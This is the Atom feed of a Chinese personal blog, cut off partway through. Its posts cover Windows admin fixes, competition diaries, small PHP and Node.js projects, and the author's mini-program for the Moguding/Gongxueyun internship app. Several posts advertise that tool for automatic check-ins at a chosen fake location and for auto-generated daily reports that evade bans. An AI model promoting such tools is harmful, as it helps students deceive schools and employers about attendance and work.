@@ -1,0 +1,475 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>白菜日记</title>
+  <icon>https://blog.thecat.top/icon.png</icon>
+  <subtitle>热爱可抵岁月漫长 | 风起风止我都在</subtitle>
+  <link href="https://blog.thecat.top/atom.xml" rel="self"/>
+  
+  <link href="https://blog.thecat.top/"/>
+  <updated>2023-07-07T07:18:08.208Z</updated>
+  <id>https://blog.thecat.top/</id>
+  
+  <author>
+    <name>Cat00011cat</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>win定时任务报错0x1</title>
+    <link href="https://blog.thecat.top/archives/windingshierror0x1.html"/>
+    <id>https://blog.thecat.top/archives/windingshierror0x1.html</id>
+    <published>2022-12-04T23:16:56.000Z</published>
+    <updated>2023-07-07T07:18:08.208Z</updated>
+    
+    <content type="html"><![CDATA[<p>程序没问题，手动可以执行。<br>网上都说是权限问题。但是检查之后发现并没问题。</p><p>解决方法：<br>在设置任务<code>起始于</code>选项添加该程序所在的路径即可；</p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="默认分类" scheme="https://blog.thecat.top/categories/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>服务器运维踩坑，Windows Server 2019实现自动登陆</title>
+    <link href="https://blog.thecat.top/archives/WindowsServer2019auto.html"/>
+    <id>https://blog.thecat.top/archives/WindowsServer2019auto.html</id>
+    <published>2022-12-03T04:37:00.000Z</published>
+    <updated>2023-07-07T08:18:44.735Z</updated>
+    
+    <content type="html"><![CDATA[<!--markdown-->之前设置了一个开机自动执行脚本，发现重启服务器定时重启之后之后没有生效，<p>原因在于，服务器重启之后，不会自动登录用户，因此没有执行脚本；<br>【服务器的定时任务开启了，用户是否登录都要执行】，但是开启这一项。。。脚本的日志窗口就不会弹出。。。好像是Windows窗口类的问题。</p><p>所以我开启了，，，只在用户登录下运行。。。</p><p>然后 重启 。。就出现了这个问题</p><p>解决方案。开启服务器重启自动登录。</p><p>步骤：打开cmd输入</p><pre><code>control userpasswords2 </code></pre><p>取消勾选“要使用本机，用户必须输入用户名和密码”，点击“应用”：<br>然后配置一下即可。。。</p><p>等待，第二天重启服务器看结果！！！！</p><p>完美解决</p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="默认分类" scheme="https://blog.thecat.top/categories/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>工学云打卡助手使用帮助文档</title>
+    <link href="https://blog.thecat.top/archives/gongxueyunhelp.html"/>
+    <id>https://blog.thecat.top/archives/gongxueyunhelp.html</id>
+    <published>2022-11-17T04:43:00.000Z</published>
+    <updated>2023-07-07T08:17:52.923Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="工学云打卡助手使用教程"><a href="#工学云打卡助手使用教程" class="headerlink" title="工学云打卡助手使用教程"></a>工学云打卡助手使用教程</h1><p>覆盖所有的蘑菇丁工学云实习项目，人工官方客户端登录、不使用外掛类软件、不篡改协议、独立IP稳定不封号，轻松完成实习任务！</p><h1 id="先绑定小程序"><a href="#先绑定小程序" class="headerlink" title="先绑定小程序"></a>先绑定小程序</h1><p><img src="https://tuchuangs.com/imgs/2022/11/17/5021e72f915854a3.png" alt="a"></p><p>没绑定小程序，请不要赞赏！（否则不会到账）</p><p>各位小主：打卡小助手为免费小程序，因是小助手且为给小主提高体验度稳定与安全性并且服务器的运维需要花费一定资金的情况下而未投放广告保持简约实用的初衷，故开启赞助赠送会员望理解！小助手给赞助小主进行相对的会员赠送，同时感谢小主对我们的支持，让更多的朋友增加了一个自动打卡平台，帮助小助手走得更远！</p><p>赞赏后赠送会员～望理解～</p><h1 id="常见问题汇总"><a href="#常见问题汇总" class="headerlink" title="常见问题汇总"></a>常见问题汇总</h1><h2 id="打卡时间"><a href="#打卡时间" class="headerlink" title="打卡时间"></a>打卡时间</h2><p>当日绑定，小程序隔天运行！！！</p><p>早上8点左右 晚上18点左右（可能会有一点延时~~~） 请耐心等待。</p><p>早不会超过11点，晚不会超过当天的23点。如果超过这个时间未打卡 那么请手动打卡！</p><h2 id="日报内容？？（不限专业）"><a href="#日报内容？？（不限专业）" class="headerlink" title="日报内容？？（不限专业）"></a>日报内容？？（不限专业）</h2><p>日报的内容都是通用的 适用于 各个专业。</p><p>内容示例：</p><p><img src="https://tuchuangs.com/imgs/2022/11/17/66d942a17deebb4c.png" alt="a"></p><h2 id="如何关闭自动（打卡）任务？"><a href="#如何关闭自动（打卡）任务？" class="headerlink" title="如何关闭自动（打卡）任务？"></a>如何关闭自动（打卡）任务？</h2><p><img src="https://tuchuangs.com/imgs/2022/11/17/30e74e6b83906ca1.png" alt=" s"></p><h2 id="推送通知是什么？"><a href="#推送通知是什么？" class="headerlink" title="推送通知是什么？"></a>推送通知是什么？</h2><p>通俗来说 就是告诉你打卡成功与否。小程序通过微信给你发消息。说打卡成功</p><p><img src="https://tuchuangs.com/imgs/2022/11/17/185c7f6ef77bba76.png" alt="a"></p><p>邮箱推送</p><p><img src="https://tuchuangs.com/imgs/2022/11/17/dab9806e4832b6eb.png" alt="q"></p><p><img src="https://tuchuangs.com/imgs/2022/11/17/c65f18bac26a9bae.png" alt="q"></p><p><img src="https://tuchuangs.com/imgs/2022/11/17/285969417cdfafd8.png" alt="a"></p><h2 id="收到异常状态？？？"><a href="#收到异常状态？？？" class="headerlink" title="收到异常状态？？？"></a>收到异常状态？？？</h2><p>异常状态 那么请手动打卡！！！次日自动恢复。</p><p>有可能是还没绑定企业，实习任务没有开启！！！</p><h2 id="如何修改位置打卡？？？"><a href="#如何修改位置打卡？？？" class="headerlink" title="如何修改位置打卡？？？"></a>如何修改位置打卡？？？</h2><p>绑定助手有选择位置，，，选择的位置就是 签到打卡时候的定位！！！</p><p>只有自动打卡才能 改位置打卡。</p><h2 id="收到登录失败的邮件？？？"><a href="#收到登录失败的邮件？？？" class="headerlink" title="收到登录失败的邮件？？？"></a>收到登录失败的邮件？？？</h2><p><img src="https://tuchuangs.com/imgs/2022/11/17/3141ab1152c58a23.png" alt="a"></p><p>就说明：你提供的账号密码app都登录不了！！！！</p><p>请自行打开工学云app进行登录，看是否能够登录。</p><p>最好前往工学云app修改密码 ，，，</p><p>未绑定用户在工学云打卡助手小程序绑定工学云。</p><p>已绑定用户在工学云打卡助手小程序我的——个人设置 修改正确的登录信息。</p><h2 id="绑定信息说明"><a href="#绑定信息说明" class="headerlink" title="绑定信息说明"></a>绑定信息说明</h2><p><img src="https://tuchuangs.com/imgs/2022/11/17/64df2d025c475302.png" alt="q"></p><h2 id="打卡地址为什么不能精确到某栋楼？"><a href="#打卡地址为什么不能精确到某栋楼？" class="headerlink" title="打卡地址为什么不能精确到某栋楼？"></a>打卡地址为什么不能精确到某栋楼？</h2><p>为了保护用户隐私，采用了模糊地址。只能定位到附近街道。</p><p>类似于这样</p><p><img src="https://tuchuangs.com/imgs/2022/11/17/7f96f117f8ee5098.png" alt="q"></p><h2 id="日报内容可以修改吗？？？"><a href="#日报内容可以修改吗？？？" class="headerlink" title="日报内容可以修改吗？？？"></a>日报内容可以修改吗？？？</h2><p>打开工学云APP，找到日报点击进去可以修改 再次提交</p><p><img src="https://tuchuangs.com/imgs/2022/11/17/b6284b6d8bae6ff9.png" alt="a"></p><p>##?登录失败，其他任务成功？？？</p><p><img src="https://tuchuangs.com/imgs/2022/11/17/c243817d3359f4f7.png" alt="a"></p><p>请自行登录工学云app试一下账号密码对吗？？？</p><p>不对请修改。</p><p>##?续费会员后还提示不到账？</p><p>##?绑定了账户和开通了会员依然提示绑定怎么办？</p><p>会员充值完毕，点击右上角三点 重新进入小程序 刷新一下即可。</p><h3 id="工学云打卡助手小程序隐私保护指引"><a href="#工学云打卡助手小程序隐私保护指引" class="headerlink" title="工学云打卡助手小程序隐私保护指引"></a>工学云打卡助手小程序隐私保护指引</h3><p>本指引是工学云打卡助手小程序开发者 （以下简称“开发者”）为处理你的个人信息而制定。</p><h4 id="开发者处理的信息"><a href="#开发者处理的信息" class="headerlink" title="开发者处理的信息"></a>开发者处理的信息</h4><p>根据法律规定，开发者仅处理实现小程序功能所必要的信息。</p><p>为了个人中心展示，开发者将在获取你的明示同意后，收集你的微信昵称、头像。</p><p>为了打卡签到服务，开发者将在获取你的明示同意后，收集你的位置信息。</p><p>开发者 收集你的邮箱，用于打卡状态推送通知。</p><h4 id="你的权益"><a href="#你的权益" class="headerlink" title="你的权益"></a>你的权益</h4><p>关于收集你的位置信息、收集你的位置信息，你可以通过以下路径：小程序主页右上角“…”—“设置”—点击特定信息—点击“不允许”，撤回对开发者的授权。</p><p>关于收集你的微信昵称、头像、收集你的微信昵称、头像，你可以通过以下路径：小程序主页右上角“…” — “设置” — “小程序已获取的信息” — 点击特定信息 — 点击“通知开发者删除”，开发者承诺收到通知后将删除信息。</p><p>关于你的个人信息，你可以通过以下方式与开发者联系，行使查阅、复制、更正、删除等法定权利。</p><p>邮箱:<a href="mailto:&#57;&#x39;&#x30;&#54;&#x36;&#55;&#x33;&#x30;&#x33;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#57;&#x39;&#x30;&#54;&#x36;&#55;&#x33;&#x30;&#x33;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a></p><h4 id="开发者对信息的存储"><a href="#开发者对信息的存储" class="headerlink" title="开发者对信息的存储"></a>开发者对信息的存储</h4><p>开发者承诺，除法律法规另有规定外，开发者对你的信息的保存期限应当为实现处理目的所必要的最短时间。</p><h4 id="信息的使用规则"><a href="#信息的使用规则" class="headerlink" title="信息的使用规则"></a>信息的使用规则</h4><p>开发者将会在本指引所明示的用途内使用收集的信息</p><p>如开发者使用你的信息超出本指引目的或合理范围，开发者必须在变更使用目的或范围前，再次以小程序公告方式告知并征得你的明示同意。</p><h4 id="信息对外提供"><a href="#信息对外提供" class="headerlink" title="信息对外提供"></a>信息对外提供</h4><p>开发者承诺，不会主动共享或转让你的信息至任何第三方，如存在确需共享或转让时，开发者应当直接征得或确认第三方征得你的单独同意。</p><p>开发者承诺，不会对外公开披露你的信息，如必须公开披露时，开发者应当向你告知公开披露的目的、披露信息的类型及可能涉及的信息，并征得你的单独同意。</p><h4 id="你认为开发者未遵守上述约定，或有其他的投诉建议、或未成年人个人信息保护相关问题，可通过以下方式与开发者联系；或者向微信进行投诉。"><a href="#你认为开发者未遵守上述约定，或有其他的投诉建议、或未成年人个人信息保护相关问题，可通过以下方式与开发者联系；或者向微信进行投诉。" class="headerlink" title="你认为开发者未遵守上述约定，或有其他的投诉建议、或未成年人个人信息保护相关问题，可通过以下方式与开发者联系；或者向微信进行投诉。"></a>你认为开发者未遵守上述约定，或有其他的投诉建议、或未成年人个人信息保护相关问题，可通过以下方式与开发者联系；或者向微信进行投诉。</h4><p>邮箱 :?<a href="mailto:&#x39;&#57;&#48;&#x36;&#x36;&#55;&#51;&#x30;&#51;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#x39;&#57;&#48;&#x36;&#x36;&#55;&#51;&#x30;&#51;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a></p><p>更新日期：2022-10-14</p><p>生效日期：2022-10-14</p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="默认分类" scheme="https://blog.thecat.top/categories/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>蘑菇丁工学云打卡助手历史版本</title>
+    <link href="https://blog.thecat.top/archives/gongxueyunversion.html"/>
+    <id>https://blog.thecat.top/archives/gongxueyunversion.html</id>
+    <published>2022-11-17T04:38:00.000Z</published>
+    <updated>2023-07-07T08:10:56.298Z</updated>
+    
+    <content type="html"><![CDATA[<p>工学云打卡助手v3.0</p><p><img src="https://tuchuangs.com/imgs/2022/11/17/c937d1f74150492a.png" alt="v3.0"></p><p>工学云打卡助手v2.0<br><img src="https://tuchuangs.com/imgs/2022/11/17/ed45f37785ef01bb.png" alt="v2.0"></p><p>工学云打卡助手v1.0<br><img src="https://tuchuangs.com/imgs/2022/11/17/b946dc7a17c83789.png" alt="v1.0"></p><p>雏形0.0<br><img src="https://tuchuangs.com/imgs/2022/11/17/7564781e81059099.png" alt="v0.0"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="默认分类" scheme="https://blog.thecat.top/categories/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>关于金砖物联网选拔赛的一些总结</title>
+    <link href="https://blog.thecat.top/archives/jzwlw.html"/>
+    <id>https://blog.thecat.top/archives/jzwlw.html</id>
+    <published>2022-10-10T20:13:00.000Z</published>
+    <updated>2023-07-07T08:15:35.706Z</updated>
+    
+    <content type="html"><![CDATA[<!--markdown-->接着上一个赛项落下帷幕，相隔半月。<p>选拔赛开始啦，本来线下赛由于疫情改为了线上赛（体验非常的不好）…</p><p>没有取得很好的成绩，每次都离第一差一点。<br><img src="https://s1.ax1x.com/2022/11/25/zYZIfS.png" alt="成绩"><br><img src="https://s1.ax1x.com/2022/11/25/zYZ5Y8.png" alt="排名"></p><p>线上赛场过程：<br>一堆传感器硬件搭建一个智慧场景~<br><img src="https://s1.ax1x.com/2022/11/25/zYZHyj.png" alt="智慧家居传感器接线"><br><img src="https://s1.ax1x.com/2022/11/25/zYZ7lQ.png" alt="智慧家居上位机数据采集"><br><img src="https://s1.ax1x.com/2022/11/25/zYZOwq.png" alt="智慧大鹏上位机数据采集"></p><p>屏幕太小，这个线接得乱七八糟的。好在是跑起来啦。</p><p>进过一系列的比赛我发现我屁都没学到，没有自己擅长的领域。<br>我常常在想我要是一直专注于一个领域，或者我不会有那么多的遗憾。</p><p>下一步，开始备考本科，希望自己可以一战成本！！！<br><img src="https://s1.ax1x.com/2022/11/25/zYeu1e.png" alt="时间不多了"><br>高数、英语都令我很痛苦。。。</p><blockquote><p>我觉得自己好像小丑啊</p></blockquote><p>之前一直怕这怕那的，<br>一直担心比赛影响专升本的学习，<br>到最后到现在专升本报名之后才开始真正的准备考试，</p><p>哈哈哈哈<br>好好笑啊哈哈哈哈<br>好好笑啊哈哈哈哈<br>好好笑啊</p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="网络运维" scheme="https://blog.thecat.top/categories/%E7%BD%91%E7%BB%9C%E8%BF%90%E7%BB%B4/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>释放双手！工学云打卡助手小程序上线啦~~~</title>
+    <link href="https://blog.thecat.top/archives/gongxueyun.html"/>
+    <id>https://blog.thecat.top/archives/gongxueyun.html</id>
+    <published>2022-10-05T17:38:00.000Z</published>
+    <updated>2023-07-07T08:06:51.760Z</updated>
+    
+    <content type="html"><![CDATA[<p>gongxueyun.com</p><p><img src="https://s1.ax1x.com/2022/11/09/zSyTdH.png" alt="工学云蘑菇丁自动打卡修改位置"><br>故事的开始，，，天天被催工学云<br>我们每天要在 蘑菇丁APP上进行打卡这关系到我们是否能正常毕业，但是我们会忘记打卡 并且感觉这很麻烦 所以就自己写了这个平台。为了帮助大家解决烦恼经过数月工学云自动打卡小程序诞生了，日报周报月报还支持自定义位置打卡签到等等等…欢迎大家扫码体验。<br><img src="https://tuchuangs.com/imgs/2022/10/06/75e784232a73de15.png" alt="111"></p><blockquote><p>扫码体验~~~<br><img src="https://s1.ax1x.com/2022/11/09/zSsfbQ.png" alt="蘑菇丁工学云打卡助手"></p></blockquote><p>[scode type&#x3D;”green”]工学云蘑菇丁打卡助手历史版本[&#x2F;scode]</p><blockquote><p>为大家解决了以下问题：<br>工学云蘑菇丁修改定位，蘑菇丁工学云定时自动打卡，蘑菇丁工学云自动写周报日报月报。</p></blockquote><p>微信搜索：工学云打卡助手<br><img src="https://tuchuangs.com/imgs/2022/10/06/973314b1d06b51d4.jpg" alt="微信搜索小程序：工学云打卡助手"></p><p>蘑菇丁工学云打卡小程序介绍<br>工学云打卡助手原名八爪鱼助手，是一个非常实用的辅助打卡工具，可以帮助大家在蘑菇钉工学云软件中自动打卡，只要登录账号就可以轻松打卡了，不用的担心忘记打卡这样的事情发生了。不少用户每个月总会有几次忘记卡，补卡又非常的麻烦，那么就可以使用这个打卡助手啦，解放双手省时省力。</p><blockquote><p>历史版本</p></blockquote><p>展示<br><img src="https://tuchuangs.com/imgs/2022/10/06/379348eff06db57a.jpg" alt="demo1"><br><img src="https://tuchuangs.com/imgs/2022/10/06/ea1a088ab73ced21.jpg" alt="demo2"></p><p>功能</p><ul><li>自动打卡签到</li><li>自动写日报、周报、月报以及总结（适合各个专业，可以选择是否开启）</li><li>一键补卡</li><li>推送：小程序推送以及邮件推送两种方式</li></ul><p>博主自己也在使用，无封号风险。推荐！！！</p><p>最新地址：<a href="http://moguding.thecat.top/">http://moguding.thecat.top/</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="默认分类" scheme="https://blog.thecat.top/categories/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>关于高职组移不动应用app开发我想对自己说的一些话</title>
+    <link href="https://blog.thecat.top/archives/gzapp.html"/>
+    <id>https://blog.thecat.top/archives/gzapp.html</id>
+    <published>2022-09-22T22:12:00.000Z</published>
+    <updated>2023-07-07T08:16:40.691Z</updated>
+    
+    <content type="html"><![CDATA[<p>我尽力了，很遗憾，没能打进国赛！！！</p><p>随着一场又一场比赛的结束，或许这也宣告着我的大专生涯的结束。<br>但怎么说呢，或许遗憾才是青春原本该有的样子吧……<br><img src="https://s1.ax1x.com/2022/11/25/zYElmq.jpg" alt="遗憾"></p><p>这场比赛是我投入最多的一场比赛，一路摸爬滚打但最后还是输了。<br>或许怪我不够坚定，总犹豫不决怕这怕那。<br>原本定于去年1月份的比赛因为收到疫情的影响，延期到了2022年四月，<br>但是四月又一次受到疫情影响接着延期，然而这一次延期之后比赛的事情就很凄凉没有任何的通知。</p><p>就在这个时候老师又给我推荐了嵌入式国赛，没办法硬着头皮学三个月江西参赛，<br>可能是我没有配合好队友最终导致与三等奖相差五分，这一次我真的很遗憾，<br>明明可以的事情却被自己搞砸了。</p><p>在准备比赛的时候我尝尝怀疑自己，接着返校之后…<br>移动应用开发的省赛又来了，定于13号举办。<br>然而这一次又延期一周，23号终于比赛了<br>但是因为我的不坚定我把移动开发抛之脑后，四个月没写过app了很多都不熟练了，</p><p>很喜欢董宇辉老师的一句话“ <strong>所以勤奋、重复、大量的练习，是给每一个普通人成才的机会。</strong>”</p><p>本来可以的事情，因为自己的犹豫不决不坚定导致没有拿到很好的成绩，最终与本科免试无缘…</p><p>回头看，这一切的一切都是源于自己的不坚定总是自我怀疑犹豫不决导致的。<br>目前回家准备专升本考试啦，希望这一次我不在犹豫不决不坚定要相信自己可以啊……</p><p>接口<br>API文档：<a href="http://124.93.196.45:10001/pdf/%E6%99%BA%E6%85%A7%E5%9F%8E%E5%B8%82%E5%B9%B3%E5%8F%B0Open%20API_V.2.0.pdf">124.93.196.45:10001</a><br>服务器地址：<a href="http://124.93.196.45:10001/">124.93.196.45:10001</a></p><p>演示<br><img src="https://s1.ax1x.com/2022/11/10/zp05xU.png" alt="首页"><br><img src="https://s1.ax1x.com/2022/11/10/zp0LI1.png" alt="地铁"><br><img src="https://s1.ax1x.com/2022/11/10/zp0XPx.png" alt="地铁2"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="代码如诗" scheme="https://blog.thecat.top/categories/%E4%BB%A3%E7%A0%81%E5%A6%82%E8%AF%97/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>关于嵌入式开发国赛的一次经历</title>
+    <link href="https://blog.thecat.top/archives/qrs.html"/>
+    <id>https://blog.thecat.top/archives/qrs.html</id>
+    <published>2022-08-30T20:28:00.000Z</published>
+    <updated>2023-07-07T08:15:12.128Z</updated>
+    
+    <content type="html"><![CDATA[<!--markdown-->嵌入式开发从底层到应用，<p>从元器件焊接、原理图、协议、到着手写代码<br>经过了我感觉很漫长很煎熬的四个月，这期间无数次想过放弃。<br>很多因素，疫情、延期、毕业、升学、就业、非电子专业。<br>我也曾想过退赛，为此还被校领导骂了。</p><p>没办法退也退不了啦，只有含泪学了。</p><p>昆明-江西，连飞带走经历了将近2000km的路程。</p><p>比赛前，我们在酒店度过了煎熬的夜晚。还有很多东西未学。<br>赛场发挥早上虽然出了点小插曲，但是程序还是烧写到了开发板。拿到了20分。</p><p>但是可能因为太想赢，也想给自己的大专生涯画上一个句号。<br>没吃午饭，导致下午的那一场比赛大得一塌糊涂。</p><p>第一天比完，我们很失落的回到了酒店。一直安慰自己还有希望。<br>还有一场比赛！！！其实我知道希望是渺茫的。但是一直在做心里斗争。</p><p>第二天比赛开始了第三场比赛，第三场比赛算是完成了 我们预期的操作吧。</p><p>第一天比完赛，那时候真的压力巨大（面对各种压力），晚上回到酒店。<br>我们整个人就瘫了一样，说趟两分钟洗漱，一趟到了第二天6点，，，天还没亮。<br>大巴就来接着我们去赛场了，真的感觉像做梦一样。就比完了。</p><blockquote><p>训练照片</p></blockquote><p><img src="https://s1.ax1x.com/2022/11/25/zYmqI0.png" alt="龙芯开发板汽车仪表盘"><br><img src="https://s1.ax1x.com/2022/11/25/zYmjRU.png" alt="智障小车"></p><p>比完赛哪天下午，酒店窗外的天气就跟我的心情一样~~~<br>很迷很迷很迷</p><p><img src="https://s1.ax1x.com/2022/11/25/zYm8KJ.png" alt="窗外"></p><p>我望着窗外也变得迷茫起来了，，，</p><ul><li><p>最后感谢指导<strong>龚老师</strong>，带我玩嵌入式。<br>自己也挺愧疚的，带我们这么久，没拿奖。。。唉~~</p></li><li></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="代码如诗" scheme="https://blog.thecat.top/categories/%E4%BB%A3%E7%A0%81%E5%A6%82%E8%AF%97/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>实训周项目基于PHP学生管理系统的开发</title>
+    <link href="https://blog.thecat.top/archives/phpstu.html"/>
+    <id>https://blog.thecat.top/archives/phpstu.html</id>
+    <published>2022-05-13T21:30:00.000Z</published>
+    <updated>2023-07-07T08:07:25.798Z</updated>
+    
+    <content type="html"><![CDATA[<p>实现功能</p><ul><li>登录角色权限（教师端、学生端）</li></ul><p>教师端主要功能：</p><ul><li>学生管理</li><li>班级管理</li><li>课程管理</li><li>成绩管理</li><li>一键管理</li><li>个人信息修改</li></ul><p>学生端主要功能</p><ul><li>个人信息修改</li><li>只具有查看功能（不具备所有的操作数据功能）</li></ul><p>demo<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220514133616.png" alt="登录页"><br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220514134038.png" alt="teacher端主页"><br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220514134320.png" alt="student端主页"></p><p>技术栈</p><ul><li><p>mysql+php</p></li><li><p>bootstrap</p></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="代码如诗" scheme="https://blog.thecat.top/categories/%E4%BB%A3%E7%A0%81%E5%A6%82%E8%AF%97/"/>
+    
+    
+    <category term="代码" scheme="https://blog.thecat.top/tags/%E4%BB%A3%E7%A0%81/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>林职告白墙APP即将上线</title>
+    <link href="https://blog.thecat.top/archives/lzgbq.html"/>
+    <id>https://blog.thecat.top/archives/lzgbq.html</id>
+    <published>2022-04-16T21:58:00.000Z</published>
+    <updated>2023-07-07T08:13:30.088Z</updated>
+    
+    <content type="html"><![CDATA[<p>独立绘制APP原型以及功能编码实现</p><p>![ynftc][1]<br>![ynftc][2]<br>![ynftc][3]<br>![ynftc][4]<br>![ynftc][5]</p><p>由于学业繁忙，项目已暂停维护！！！</p><p>  [1]: <a href="https://cdn.jsdelivr.net/gh/lateral404/image/image/%E6%89%B9%E6%B3%A8">https://cdn.jsdelivr.net/gh/lateral404/image/image/批注</a> 2022-04-19 161505.png<br>  [2]: <a href="https://cdn.jsdelivr.net/gh/lateral404/image/image/Snipaste_2022-04-19_16-10-30.png">https://cdn.jsdelivr.net/gh/lateral404/image/image/Snipaste_2022-04-19_16-10-30.png</a><br>  [3]: <a href="https://cdn.jsdelivr.net/gh/lateral404/image/image/Snipaste_2022-04-19_16-10-53.png">https://cdn.jsdelivr.net/gh/lateral404/image/image/Snipaste_2022-04-19_16-10-53.png</a><br>  [4]: <a href="https://cdn.jsdelivr.net/gh/lateral404/image/image/Snipaste_2022-04-19_16-11-06.png">https://cdn.jsdelivr.net/gh/lateral404/image/image/Snipaste_2022-04-19_16-11-06.png</a><br>  [5]: <a href="https://cdn.jsdelivr.net/gh/lateral404/image/image/Snipaste_2022-04-19_16-11-21.png">https://cdn.jsdelivr.net/gh/lateral404/image/image/Snipaste_2022-04-19_16-11-21.png</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="代码如诗" scheme="https://blog.thecat.top/categories/%E4%BB%A3%E7%A0%81%E5%A6%82%E8%AF%97/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>林职墙图片显示问题修复</title>
+    <link href="https://blog.thecat.top/archives/lzbbq.html"/>
+    <id>https://blog.thecat.top/archives/lzbbq.html</id>
+    <published>2022-04-15T19:26:00.000Z</published>
+    <updated>2023-07-07T08:12:28.277Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="林职万能墙图片显示大小比例bug修复"><a href="#林职万能墙图片显示大小比例bug修复" class="headerlink" title="林职万能墙图片显示大小比例bug修复"></a>林职万能墙图片显示大小比例bug修复</h3><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220416113047.png" alt="bug"> <em>就这，就这，想阻挡我看</em>丝？？？*</p><p>修复思路：<br>1、将数据库的图片大小全部改为宽50%高自动。<br>2、图片保存到数据库取消图片自动设置30px的宽高。<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220416113021.png" alt="debug"></p><p>知识点补充：mysql批量替换某个字段的部分内容<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220416113426.png" alt="mysql"></p><pre><code>UPDATE person SET urls = (REPLACE(urls,&#39;xh&#39;,id));</code></pre><p>最终的sql语句<br>    <code>UPDATE 表名 SET 字段名 = (REPLACE(字段名,&#39;width=&quot;30px&quot; height=&quot;30px&quot;&#39;, &#39;width=&quot;50%&quot; height=&quot;auto&quot;&#39;));</code></p><p>修复完毕，手动滑稽.jpg<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/Snipaste_2022-04-16_12-02-45.png" alt="ynftclove.thecat.top"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="代码如诗" scheme="https://blog.thecat.top/categories/%E4%BB%A3%E7%A0%81%E5%A6%82%E8%AF%97/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Node.js服务部署</title>
+    <link href="https://blog.thecat.top/archives/Node.js.html"/>
+    <id>https://blog.thecat.top/archives/Node.js.html</id>
+    <published>2022-04-11T03:11:00.000Z</published>
+    <updated>2023-07-07T07:36:55.180Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>Public 公共静态资源<br>Route 路由（html路径）<br>Template （视图层）<br>Server服务器配置文件（总览全局）<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220411191147.png" alt="结构"></p><h3 id="注册静态目录（我们自己创建的目录）"><a href="#注册静态目录（我们自己创建的目录）" class="headerlink" title="注册静态目录（我们自己创建的目录）"></a>注册静态目录（我们自己创建的目录）</h3><p>在server.js文件里配置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;./public&#x27;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220411191345.png" alt="server.js"></p><h3 id="配置网页路径（路由）route文件夹"><a href="#配置网页路径（路由）route文件夹" class="headerlink" title="配置网页路径（路由）route文件夹"></a>配置网页路径（路由）route文件夹</h3><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220411191434.png" alt="route"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/shopping.html&#x27;</span>,<span class="keyword">function</span>(<span class="params">request,response</span>)&#123;  </span><br><span class="line"><span class="comment">// render()表示‘渲染’，并指定页面的来源是shopping.ejs</span></span><br><span class="line">response.<span class="title function_">render</span>(<span class="string">&#x27;./shopping.ejs&#x27;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="网站首页配置"><a href="#网站首页配置" class="headerlink" title="网站首页配置"></a>网站首页配置</h3><p><strong>方法1、</strong><br>send()方法改为render()方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 